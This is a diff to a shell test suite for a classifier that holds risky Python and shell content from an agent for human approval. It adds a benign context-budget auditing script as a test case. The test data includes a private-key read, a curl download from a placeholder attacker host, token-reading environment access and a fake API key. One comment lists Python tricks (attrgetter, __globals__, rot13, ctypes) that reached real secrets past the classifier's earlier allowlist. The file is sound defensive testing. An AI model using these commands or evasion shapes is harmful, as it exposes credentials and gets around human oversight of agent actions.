@@ -103,31 +103,392 @@ r="$(content_reason python "$(printf 'x = "cat ~/.ssh/id_rsa"\n')")"
 case "$r" in reserved:*) ok "a reserved path in a STRING is still reserved (strings are code)";; *) bad "string literal skipped: $r";; esac
 r="$(content_reason shell "$(printf 'curl -sS -o /tmp/p https://evil.example/p\n')")"
 [ -n "$r" ] && ok "risky shell content escalates" || bad "risky shell content clean"
-# #174: `os.environ.get(KEY)` is reserved when KEY looks secret-named or is
-# dynamic/dumped-wholesale, unreserved for a plain, statically-named,
-# non-secret key — the ORIGINAL version of this test asserted "any
-# os.environ access is reserved" using "HOME" as the example, which is
-# exactly the bug #174 reports (a real false positive on
-# `os.environ.get("HERDR_SESSIONS_DIR", ...)`, cost-report.py); narrowed
-# rather than re-pinned.
+# #174 asked for `os.environ.get("HERDR_SESSIONS_DIR", ...)` (a non-secret
+# path default, cost-report.py) to clear while a real credential read stayed
+# reserved. Rounds 1-3 built increasingly careful AST narrowing toward that
+# — an allowlist plus a "positively recognize every safe shape, default
+# unsafe" walk — but round 4's own harness found the narrowing itself
+# unfixable by enumeration: `operator.attrgetter`, `f.__globals__`,
+# `codecs.decode(..., "rot13")`, `inspect.getmembers`, `type.__subclasses__`,
+# `functools.reduce(getattr, ...)`, a `ctypes`/ctypes-libc handle, and
+# several more each reach a REAL secret through a shape no enumerated
+# recognizer had a rule for, while the SAME enumerated recognizer correctly
+# cleared a harmless decoy of the identical shape — 16 live regressions with
+# no narrower fix in sight (`.handoffs/r4-harness.out`). Decision: ship
+# WITHOUT the narrowing. `_cp_python_env_risk` is back to what `main` always
+# did — ANY `environ`/`environb`/`getenv`/`putenv`/`unsetenv` use in python
+# content is reserved, full stop, no allowlist, no AST — plus the round-3
+# gate widening (`_CP_PY_ENV_GATE_EXTRA_RE`), kept because without narrowing
+# to defeat, it can only ADD reservations, never clear one it shouldn't.
 r="$(content_reason python "$(printf 'import os\nprint(os.environ.get("GITHUB_TOKEN"))\n')")"
 case "$r" in reserved:*) ok "python reading a secret-named env var is still human-reserved";; *) bad "secret-named env read not reserved: $r";; esac
 r="$(content_reason python "$(printf 'import os\nprint(os.environ.get("HOME"))\n')")"
-[ -z "$r" ] && ok "python reading a plain, non-secret-named env var is not reserved (#174)" || bad "non-secret env read reserved: $r"
+case "$r" in reserved:*) ok "any os.environ access is reserved, even a plain non-secret-named key (#174 reverted, round 4)";; *) bad "HOME env read not reserved: $r";; esac
 r="$(content_reason python "$(printf 'import os\nprint(dict(os.environ))\n')")"
 case "$r" in reserved:*) ok "python dumping os.environ wholesale is still human-reserved";; *) bad "wholesale environ dump not reserved: $r";; esac
 
 printf '== python content: KEY/TOKEN/SECRET-named ASSIGNMENTS, AST-based (#174) ==\n'
-# BYTES_PER_TOKEN/tokens/an f-string format spec/os.environ.get on a
-# non-secret name — the exact repro from #174 (thurber-os
-# audit_context_budget.py, this repo's own cost-report.py). None is a
-# credential; the ORIGINAL regex-over-quote-stripped-text check reserved
-# every one of them because it cannot tell a bare `None`/number/format-spec
-# apart from a hardcoded secret string once quotes are gone.
+# BYTES_PER_TOKEN/tokens/an f-string format spec — the exact repro from
+# #174 (thurber-os audit_context_budget.py). None is a credential; the
+# ORIGINAL regex-over-quote-stripped-text check reserved every one of them
+# because it cannot tell a bare `None`/number/format-spec apart from a
+# hardcoded secret string once quotes are gone. This half of #174 stands —
+# only the os.environ KEY-NAME allowlist half was reverted (round 4, see
+# above).
 r="$(content_reason python "$(printf 'BYTES_PER_TOKEN = 2.31\ntokens = None\nprint(f"... {tokens:>5}tok")\n')")"
 [ -z "$r" ] && ok "BYTES_PER_TOKEN/tokens=None/an f-string format spec are not credentials (#174)" || bad "ordinary token-named code flagged: $r"
 r="$(content_reason python "$(printf 'import os\nfrom pathlib import Path\nSESSIONS_DIR = Path(os.environ.get("HERDR_SESSIONS_DIR", "/tmp"))\n')")"
-[ -z "$r" ] && ok "os.environ.get on a non-secret name inside an assignment is not reserved (#174)" || bad "SESSIONS_DIR assignment flagged: $r"
+case "$r" in reserved:*) ok "os.environ.get inside an assignment is reserved regardless of key name (round 4)";; *) bad "SESSIONS_DIR assignment not reserved: $r";; esac
+# The real #174 acceptance target itself — thurber-os
+# scripts/audit_context_budget.py verbatim (no secrets; it is a public repo
+# script) — found, via bisection, THREE independent false-positive causes
+# this synthetic minimal repro above never exercised: (1) `con.execute(...)`
+# and a docstring's prose use of "eval" substring-matched
+# `_CP_PY_ENV_GATE_EXTRA_RE`'s bare `exec`/`eval` entries and reserved
+# unconditionally on TEXT alone; (2) the module docstring's removal (via
+# tokenize/untokenize) leaves bare-backslash filler lines to preserve
+# subsequent line numbers, which `scannable_command`'s shell-continuation
+# fold then collapses, shifting every `(lineno, name, value)` credential
+# correlation after it out of alignment; (3) `tokens`/`session_tokens`
+# (LLM byte-count variables, not credentials) computed via
+# `round(...)`/`sum(genexpr)` never correlated because `render()` only
+# proved bare constants safe, and an f-string's OWN `{tokens:>5}` format
+# spec text-matched the same `identifier[:=]value` shape the KV gate looks
+# for. All three are fixed: the extra gate now only decides whether to run
+# an AST check that confirms a genuine Call/Attribute escape shape;
+# `_cp_python_cred_narrow` walks the same f-string-masked text `ast.parse`
+# consumes, never `scannable_command`'s folded text; and `render()`
+# recognizes `round`/`len`/`sum`/`abs` — builtins that can never return a
+# string — as a provably-non-secret value shape.
+r="$(content_reason python "$(cat <<'ACBEOF'
+#!/usr/bin/env python3
+"""Keep the always-injected context small enough that agents still read it.
+
+WHY. Every `AGENTS.md` under ~/Code is prepended to a session's system prompt —
+the team file for every repo, the per-repo file for that repo, and (for spawned
+workers) the canonical-rules copy herdr appends. Guardrails have to live there,
+because a lesson nobody is shown is not a guardrail. But the same property makes
+it the one document that costs something on every single turn, in every session,
+forever: past a few thousand words agents skim it, and the rule that matters is
+the one they skim past. The failure is silent — nothing errors, behaviour just
+drifts back to what the model would have done anyway.
+
+So the budget is the mechanism that keeps the tiering honest:
+
+    guardrail  -> AGENTS.md          (must change behaviour, budgeted here)
+    lesson     -> mnemopi `retain`   (recalled on relevance, unlimited)
+    narrative  -> .handoffs/notepad  (read on demand, unlimited)
+
+A repo over budget is not told "delete a rule"; it is told to move the entries
+that are lessons rather than guardrails into the store built for them.
+
+RATCHET, NOT A CLIFF. Seven repos are already over the hard cap (tg-portal
+32 KB, tntpgh-dev 23 KB, idx-magic-sync 18 KB…), and failing CI on day one
+would just get this check disabled. So the rule is: **nothing may grow.**
+Today's sizes are the baseline; a file over its cap may only shrink, and a file
+under budget may grow up to the soft cap. Adding a guardrail to an over-budget
+repo therefore forces moving something out of it first — which is the behaviour
+we actually want.
+
+TOKENS. Measured 2026-09-27 (Opus 5.5, `omp -p --mode json --no-session --thinking
+off`, see `--measure`): `~/Code/AGENTS.md` is 13,764 B -> 5,202 tokens (2.646
+B/tok); `thurber-os/AGENTS.md` is 7,539 B -> 3,816 tokens (1.976 B/tok). The two
+anchors average to **2.31 bytes/token** — use that, not the ~4 B/tok this file's
+comments used to assume (that guess made every printed token figure ~1.7x too
+low). BYTES_PER_TOKEN below is that calibrated constant; it converts every size
+in this script to an estimate, it does not change any cap or the ratchet logic,
+which is about reading length, not tokens.
+
+SCOPE. The AGENTS.md ratchet below only ever covered ~9k of a measured 32k-token
+first request. The other always-loaded surfaces — the harness's own
+~/.omp/agent/AGENTS.md and RULES.md, the rendered <skills> list, and the rule
+description lines omp surfaces — are ratcheted the same way as a second table,
+`other_targets()`, each sized as a proxy for what a session is actually shown
+(the docstring on each explains the proxy). Tool schemas (~10k) and the harness
+prompt itself are not files we own, so they are measured, not ratcheted:
+`--measure [cwd]` runs real `omp` ablations and prints actual input tokens. It
+costs real money, so it never runs in `ci.sh`.
+
+Exit 1 when a file (or a proxy total) grew past its allowance. `--rebaseline`
+records current sizes (use it after a deliberate cleanup, never to silence
+growth).
+"""
+from __future__ import annotations
+
+import json
+import sqlite3
+import subprocess
+import sys
+from pathlib import Path
+
+HOME = Path.home()
+CODE = HOME / "Code"
+REPO_ROOT = Path(__file__).resolve().parent.parent
+# A linked worktree's directory is named after the branch; the repo whose
+# AGENTS.md a session loads is the one the git common dir belongs to.
+REPO_NAME = Path(subprocess.run(
+    ["git", "-C", str(REPO_ROOT), "rev-parse", "--path-format=absolute", "--git-common-dir"],
+    capture_output=True, text=True, check=False).stdout.strip() or REPO_ROOT / ".git").parent.name
+BASELINE = REPO_ROOT / "docs" / "context-budget-baseline.json"
+SOFT_BYTES = 6_000     # a page and a half, still read in full
+HARD_BYTES = 10_000    # past here, agents demonstrably skim
+TEAM_SOFT = 14_000     # the shared ~/Code/AGENTS.md carries fleet-wide rules
+TEAM_HARD = 20_000
+
+# Calibrated 2026-09-27 from the two AGENTS.md anchors above (2.646 + 1.976) / 2.
+# Re-derive with `--measure` after any material change to harness prompt size.
+BYTES_PER_TOKEN = 2.31
+
+# Harness surfaces beyond ~/Code/*/AGENTS.md, each a (label, soft, hard) cap.
+# Caps chosen at ~1.2x / ~2x today's measured size — same ratchet shape as the
+# AGENTS.md targets, sized for surfaces that are normally much smaller.
+HARNESS_SOFT_MULT = 1.2
+HARNESS_HARD_MULT = 2.0
+
+
+def _bytes_of(path: Path) -> int | None:
+    return path.stat().st_size if path.exists() else None
+
+
+def _skills_block_bytes() -> tuple[int, str] | None:
+    """Estimate the rendered <skills> list: '- name: description\\n' per skill.
+
+    omp keeps a condensed one-line description per skill in
+    ~/.omp/agent/skill-descriptions.db (NOT the SKILL.md frontmatter
+    description, which is much longer and never shown in the list — verified
+    2026-09-27 by comparing agent-sandbox's SKILL.md description against the
+    rendered <skills> line, which is the short summary from this db). The db
+    key is an opaque hash with no reverse index to a skill name, so this is a
+    proxy, not an exact replay: name bytes come from today's actual skill
+    directories (managed-skills + ~/.claude/skills, deduped by name — no
+    overlap observed 2026-09-27); description bytes come from the db's average
+    description length times that same skill count, since the db can carry a
+    few stale rows for removed skills. Either the skill count or the average
+    description length growing moves this total, which is all the ratchet
+    needs.
+    """
+    managed = HOME / ".omp" / "agent" / "managed-skills"
+    claude = HOME / ".claude" / "skills"
+    db = HOME / ".omp" / "agent" / "skill-descriptions.db"
+    if not db.exists():
+        return None
+    names: set[str] = set()
+    for base in (managed, claude):
+        if base.exists():
+            names.update(p.name for p in base.iterdir() if (p / "SKILL.md").exists())
+    if not names:
+        return None
+    con = sqlite3.connect(str(db))
+    row = con.execute("select count(*), sum(length(description)) from skill_descriptions").fetchone()
+    con.close()
+    db_rows, desc_total = row
+    if not db_rows:
+        return None
+    avg_desc = desc_total / db_rows
+    n = len(names)
+    name_bytes = sum(len(name) for name in names)
+    # "- " + name + ": " + description + "\n" per line
+    total = name_bytes + round(avg_desc * n) + n * 5
+    return total, f"{n} skills (managed-skills+~/.claude/skills), db avg desc {avg_desc:.0f}B"
+
+
+def _rule_desc_bytes() -> tuple[int, str] | None:
+    """Sum the frontmatter `description:` line omp surfaces per rule file.
+
+    Global rules (~/.omp/agent/rules/*.md, always loaded) plus this repo's own
+    .omp/rules/*.md (loaded only in this cwd, matching how the evidence table's
+    "rules description lines" ablation was measured from this repo). Other
+    repos' .omp/rules are outside a thurber-os session's own budget.
+    """
+    global_dir = HOME / ".omp" / "agent" / "rules"
+    repo_dir = REPO_ROOT / ".omp" / "rules"
+    dirs = [d for d in (global_dir, repo_dir) if d.exists()]
+    if not dirs:
+        return None
+    total = 0
+    count = 0
+    for d in dirs:
+        for f in sorted(d.glob("*.md")):
+            for line in f.read_text(errors="replace").splitlines():
+                if line.startswith("description:"):
+                    total += len(line.encode())
+                    count += 1
+                    break
+    if count == 0:
+        return None
+    return total, f"{count} rule files ({global_dir} + {repo_dir.relative_to(REPO_ROOT)})"
+
+
+def other_targets() -> list[tuple[str, int | None, str]]:
+    """(label, measured_bytes_or_None, note) for the non-AGENTS.md surfaces."""
+    out: list[tuple[str, int | None, str]] = []
+    for label, path in (
+        ("~/.omp/agent/AGENTS.md", HOME / ".omp" / "agent" / "AGENTS.md"),
+        ("~/.omp/agent/RULES.md", HOME / ".omp" / "agent" / "RULES.md"),
+    ):
+        size = _bytes_of(path)
+        out.append((label, size, "" if size is not None else f"missing: {path}"))
+    skills = _skills_block_bytes()
+    out.append(("skills list (rendered)", skills[0] if skills else None,
+                skills[1] if skills else "skill-descriptions.db or skill dirs missing"))
+    rules = _rule_desc_bytes()
+    out.append(("rule description lines", rules[0] if rules else None,
+                rules[1] if rules else "no rule dirs found"))
+    return out
+
+
+def targets() -> list[tuple[str, Path, int, int]]:
+    out: list[tuple[str, Path, int, int]] = []
+    team = CODE / "AGENTS.md"
+    if team.exists():
+        out.append(("~/Code/AGENTS.md", team, TEAM_SOFT, TEAM_HARD))
+    for f in sorted(CODE.glob("*/AGENTS.md")):
+        out.append((f.parent.name, f, SOFT_BYTES, HARD_BYTES))
+    return out
+
+
+def _measure() -> int:
+    """Run the real ablations with omp and print actual token counts.
+
+    Costs ~$0.25/run (several full requests to a frontier model) — never call
+    this from ci.sh. Run from bash, not the python eval kernel: the kernel's
+    trimmed env (23 vars) hangs the omp subprocess.
+    """
+    cwd = sys.argv[sys.argv.index("--measure") + 1] if "--measure" in sys.argv and \
+        len(sys.argv) > sys.argv.index("--measure") + 1 and \
+        not sys.argv[sys.argv.index("--measure") + 1].startswith("-") else str(REPO_ROOT)
+    base_cmd = ["omp", "-p", "--mode", "json", "--no-session", "--thinking", "off", "--cwd", cwd]
+    cases = [
+        ("baseline", []),
+        ("no-tools", ["--no-tools"]),
+        ("no-skills", ["--no-skills"]),
+        ("no-rules", ["--no-rules"]),
+        ("no-extensions", ["--no-extensions"]),
+    ]
+    print(f"== --measure: real omp ablations from cwd={cwd} ==")
+    results: dict[str, int] = {}
+    for name, extra_flags in cases:
+        cmd = base_cmd + extra_flags + ["hi"]
+        try:
+            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+        except (OSError, subprocess.TimeoutExpired) as exc:
+            print(f"  {name:<16} FAILED: {exc}")
+            continue
+        tokens = None
+        for line in proc.stdout.splitlines():
+            line = line.strip()
+            if not line.startswith("{"):
+                continue
+            try:
+                payload = json.loads(line)
+            except json.JSONDecodeError:
+                continue
+            usage = payload.get("usage") or (payload.get("message") or {}).get("usage")
+            if usage:
+                # Prompt side only: fresh input plus cache read/write. Never
+                # totalTokens — it includes output.
+                tokens = sum(usage.get(k, 0) for k in ("input", "cacheRead", "cacheWrite"))
+        if tokens is None:
+            print(f"  {name:<16} no usage found in output (rc={proc.returncode})")
+            continue
+        results[name] = tokens
+        print(f"  {name:<16} {tokens:>8} tokens")
+    if "baseline" in results:
+        total = results["baseline"]
+        window = 1_000_000
+        print(f"\ntotal: {total} tokens ({100 * total / window:.2f}% of a {window}-token window)")
+    return 0
+
+
+def main() -> int:
+    if "--measure" in sys.argv:
+        return _measure()
+
+    if "--rebaseline" in sys.argv:
+        BASELINE.parent.mkdir(parents=True, exist_ok=True)
+        data = {label: p.stat().st_size for label, p, _, _ in targets()}
+        for label, size, _ in other_targets():
+            if size is not None:
+                data[label] = size
+        BASELINE.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n")
+        print(f"baselined {BASELINE}")
+        return 0
+
+    base: dict[str, int] = json.loads(BASELINE.read_text()) if BASELINE.exists() else {}
+    failed: list[str] = []
+
+    def report(label: str, size: int, soft: int, hard: int) -> None:
+        was = base.get(label)
+        allowance = max(soft, was) if was is not None else hard
+        delta = "" if was is None else f"  ({size - was:+d} vs baseline)"
+        tokens = round(size / BYTES_PER_TOKEN)
+        if size > allowance:
+            failed.append(label)
+            print(f"  GREW  {label:<26} {size:>6} B  ~{tokens:>5}tok{delta}  — allowance {allowance}")
+        elif size > hard:
+            print(f"  over  {label:<26} {size:>6} B  ~{tokens:>5}tok{delta}  — over the {hard} cap, shrink it")
+        elif size > soft:
+            print(f"  warn  {label:<26} {size:>6} B  ~{tokens:>5}tok{delta}  — past the {soft} soft cap")
+        else:
+            print(f"  ok    {label:<26} {size:>6} B  ~{tokens:>5}tok{delta}")
+
+    print("== context budget (always-injected AGENTS.md files) ==")
+    per_repo: dict[str, int] = {}
+    for label, path, soft, hard in targets():
+        size = path.stat().st_size
+        per_repo[label] = size
+        report(label, size, soft, hard)
+
+    print("\n== context budget (other always-loaded surfaces) ==")
+    harness_total = 0
+    for label, size, note in other_targets():
+        if size is None:
+            print(f"  skip  {label:<26} {note}")
+            continue
+        harness_total += size
+        was = base.get(label)
+        soft = round((was if was is not None else size) * HARNESS_SOFT_MULT)
+        hard = round((was if was is not None else size) * HARNESS_HARD_MULT)
+        report(label, size, soft, hard)
+
+    # A single session loads ~/Code/AGENTS.md + ONE repo's AGENTS.md (the cwd
+    # it started in) + the harness surfaces above — never every repo's file at
+    # once (that would be ~91 KB across 13 repos and no session does that).
+    # Report the actual per-session number, using this repo (thurber-os,
+    # where the session runs) as the repo term, plus the heaviest repo for
+    # context on the worst case a session anywhere in the fleet could see.
+    team_bytes = per_repo.get("~/Code/AGENTS.md", 0)
+    this_repo_bytes = per_repo.get(REPO_NAME, 0)
+    heaviest_label, heaviest_bytes = max(
+        ((label, size) for label, size in per_repo.items() if label != "~/Code/AGENTS.md"),
+        key=lambda kv: kv[1], default=(None, 0))
+    session_total = team_bytes + this_repo_bytes + harness_total
+    worst_total = team_bytes + heaviest_bytes + harness_total
+    session_tokens = round(session_total / BYTES_PER_TOKEN)
+    worst_tokens = round(worst_total / BYTES_PER_TOKEN)
+    print(f"\nsession total ({REPO_NAME}): {session_total} B  ~{session_tokens} tok"
+          f" (at {BYTES_PER_TOKEN} B/tok, calibrated 2026-09-27)")
+    print(f"worst-case repo ({heaviest_label}): {worst_total} B  ~{worst_tokens} tok")
+
+    if failed:
+        print(f"\nFAIL — grew past allowance: {', '.join(failed)}")
+        print("Fix by MOVING, not deleting. A rule that describes what happened is a")
+        print("LESSON — `retain` it, or put the narrative in .handoffs/notepad.md. A")
+        print("rule that changes what an agent does next time is a GUARDRAIL and stays.")
+        print("After a deliberate cleanup: scripts/audit_context_budget.py --rebaseline")
+        return 1
+    print("\nPASS — nothing grew past its allowance")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+ACBEOF
+)")"
+case "$r" in
+  ""|"python uses subprocess"*) ok "the real #174 acceptance script (thurber-os audit_context_budget.py) clears or is only REVIEW-class for its subprocess use, never RESERVED" ;;
+  *) bad "audit_context_budget.py regressed: $r" ;;
+esac
 # Negative: a real hardcoded secret literal must still be reserved, whether
 # assigned with '=' or an annotated ':', or as a dict-literal value.
 r="$(content_reason python "$(printf 'API_KEY = "sk-live-1234567890abcdef1234567890"\n')")"
